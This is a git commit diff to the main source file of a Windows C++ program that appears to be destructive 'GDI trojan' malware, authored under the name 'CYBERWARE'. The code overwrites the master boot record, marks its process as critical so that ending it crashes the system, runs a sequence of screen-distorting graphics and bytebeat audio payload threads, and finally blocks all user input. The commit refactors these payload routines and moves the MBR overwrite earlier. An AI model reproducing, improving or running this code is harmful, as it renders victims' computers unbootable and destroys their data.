afdf46b447f4d21c599e6a014c699c906547bcfb
CYBERWARE <t3nx1ltiwzao123@gmail.com>
2024-12-19 00:55:31 -0300

    SOURCE  (updated)

--- SOURCE CODE/Main.cpp
+++ SOURCE CODE/Main.cpp
@@ -1,3 +1,4 @@
+typedef struct IUnknown IUnknown;
 #include "soprano.h"
 
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
@@ -18,90 +19,75 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	Sleep(rand() % 5000);
 
+	MBR::OverwriteMBR();
 	System::SetProcessCritical();
 
-	MBR::OverwriteMBR();
-
-	HANDLE hPayload1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
-	HANDLE hBytebeat1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
-	HANDLE tPayload1 = CreateThread(NULL, NULL, &PayloadsGdi::Load1, hPayload1, NULL, NULL);
-	HANDLE tBytebeat1 = CreateThread(NULL, NULL, &Bytebeats::Beat1, hBytebeat1, NULL, NULL);
+	HANDLE hp = 0;
+	HANDLE Payload1 = ThreadExecute(&PayloadsGdi::Load1, &hp);
+	HANDLE Bytebeat1 = ThreadExecute(&Bytebeat::Beat1, NULL);
 
 	Sleep(1000 * 15); // 15s
-
-	System::ThreadAbort(tPayload1, hPayload1);
-	Bytebeats::Abort(tBytebeat1, hBytebeat1);
+	Bytebeat::Abort(Bytebeat1);
+	ThreadAbort(Payload1, hp);
 	System::cls();
 
-	HANDLE hPayload2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
-	HANDLE hBytebeat2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
-	HANDLE tPayload2 = CreateThread(NULL, NULL, &PayloadsGdi::Load2, hPayload2, NULL, NULL);
-	HANDLE tBytebeat2 = CreateThread(NULL, NULL, &Bytebeats::Beat2, hBytebeat2, NULL, NULL);
+	HANDLE Payload2 = ThreadExecute(&PayloadsGdi::Load2, &hp);
+	HANDLE Bytebeat2 = ThreadExecute(&Bytebeat::Beat2, NULL);
 
 	Sleep(1000 * 15); // 15s
-
-	System::ThreadAbort(tPayload2, hPayload2);
-	Bytebeats::Abort(tBytebeat2, hBytebeat2);
+	Bytebeat::Abort(Bytebeat2);
+	ThreadAbort(Payload2, hp);
 	System::cls();
 
-	HANDLE hPayload3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
-	HANDLE hBytebeat3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
-	HANDLE tPayload3 = CreateThread(NULL, NULL, &PayloadsGdi::Load3, hPayload3, NULL, NULL);
-	HANDLE tBytebeat3 = CreateThread(NULL, NULL, &Bytebeats::Beat3, hBytebeat3, NULL, NULL);
+	HANDLE Payload3 = ThreadExecute(&PayloadsGdi::Load3, &hp);
+	HANDLE Bytebeat3 = ThreadExecute(&Bytebeat::Beat3, NULL);
 
-	Sleep(1000 * 15); // 15s
-
-	System::ThreadAbort(tPayload3, hPayload3);
-	Bytebeats::Abort(tBytebeat3, hBytebeat3);
+	Sleep(1000 * 15);   // 15s
+	Bytebeat::Abort(Bytebeat3);
+	ThreadAbort(Payload3, hp);
 	System::cls();
 
-	HANDLE tBeatBeap = CreateThread(NULL, NULL, &Bytebeats::BeatBasicPalygon, NULL, NULL, NULL);
-	HANDLE tPayloadPolygon1 = CreateThread(NULL, NULL, &PolygonsFormsGdi::Hexagon, NULL, NULL, NULL);
-	HANDLE tPayloadPolygon2 = CreateThread(NULL, NULL, &PolygonsFormsGdi::Triangle, NULL, NULL, NULL);
-	Sleep(1000 * 12);  // 12s
-	System::ThreadAbort(tBeatBeap, 0);
-	HANDLE hPayload4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
-	HANDLE hBytebeat4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
-	HANDLE tPayload4 = CreateThread(NULL, NULL, &PayloadsGdi::Load4, hPayload4, NULL, NULL);
-	HANDLE tBytebeat4 = CreateThread(NULL, NULL, &Bytebeats::Beat4, hBytebeat4, NULL, NULL);
+	HANDLE BeatBeap = ThreadExecute(&Bytebeat::BeatBasicPalygon, &hp);
+	HANDLE Payload_Hexagon = ThreadExecute(&PolygonsForms::Hexagon, &hp);
+	HANDLE Payload_Triangle = ThreadExecute(&PolygonsForms::Triangle, &hp);
 
+	Sleep(1000 * 15);   // 12s
+	ThreadAbort(BeatBeap, hp);
 
-	Sleep(1000 * 15); // 15s
+	HANDLE Payload4 = ThreadExecute(&PayloadsGdi::Load4, &hp);
+	HANDLE Bytebeat4 = ThreadExecute(&Bytebeat::Beat4, NULL);
 
-	System::ThreadAbort(tPayloadPolygon1, 0);
-	System::ThreadAbort(tPayloadPolygon2, 0);
+	Sleep(1000 * 15);   // 15s
 
-	System::ThreadAbort(tPayload4, hPayload4);
-	Bytebeats::Abort(tBytebeat4, hBytebeat4);
+	ThreadAbort(Payload_Hexagon, &hp);
+	ThreadAbort(Payload_Triangle, &hp);
+	ThreadAbort(Payload4, &hp);
+	Bytebeat::Abort(Bytebeat4);
 	System::cls();
 
-	HANDLE hPayload5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
-	HANDLE hBytebeat5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
-	HANDLE tPayload5 = CreateThread(NULL, NULL, &PayloadsGdi::Load5, hPayload5, NULL, NULL);
-	HANDLE tBytebeat5 = CreateThread(NULL, NULL, &Bytebeats::Beat5, hBytebeat5, NULL, NULL);
+	HANDLE Payload5 = ThreadExecute(&PayloadsGdi::Load5, &hp);
+	HANDLE Bytebeat5 = ThreadExecute(&Bytebeat::Beat5, NULL);
 
-	Sleep(1000 * 15); // 15s
+	Sleep(1000 * 15);    // 15s
 
-	System::ThreadAbort(tPayload5, hPayload5);
-	Bytebeats::Abort(tBytebeat5, hBytebeat5);
-	System::cls();
+	ThreadAbort(Payload5, &hp);
+	Bytebeat::Abort(Bytebeat5);
+    System::cls();
 
-	HANDLE hPayload6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
-	HANDLE hBytebeat6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8200 * 64, 0);
-	HANDLE tPayload6 = CreateThread(NULL, NULL, &PayloadsGdi::Load6, hPayload6, NULL, NULL);
-	HANDLE tBytebeat6 = CreateThread(NULL, NULL, &Bytebeats::Beat6, hBytebeat6, NULL, NULL);
-	HANDLE tLoadIcon = CreateThread(NULL, NULL, &PayloadsGdi::LoadIconEffect, NULL, NULL, NULL);
+	HANDLE Payload6 = ThreadExecute(&PayloadsGdi::Load6, &hp);
+	HANDLE tLoadIcon = ThreadExecute(&PayloadsGdi::LoadIconEffect, &hp);
+	HANDLE Bytebeat6 = ThreadExecute(&Bytebeat::Beat6, NULL);
 
-	Sleep(1000 * 15); // 15s
+	Sleep(1000 * 15);    // 15s
 
-	System::ThreadAbort(tPayload6, hPayload6);
-	System::ThreadAbort(tLoadIcon, NULL);
-	Bytebeats::Abort(tBytebeat6, hBytebeat6);
+	ThreadAbort(Payload6, &hp);
+	ThreadAbort(tLoadIcon, &hp);
+	Bytebeat::Abort(Bytebeat6);
 	System::cls();
 
 	Sleep(5000);
 
-	BlockInput(TRUE); // I UPDATED HERE!! (  I DON'T KNOW WHY I DIDN'T DO THIS BEFORE -_-  )
+	BlockInput(TRUE);
 
 	Sleep(2000);
 
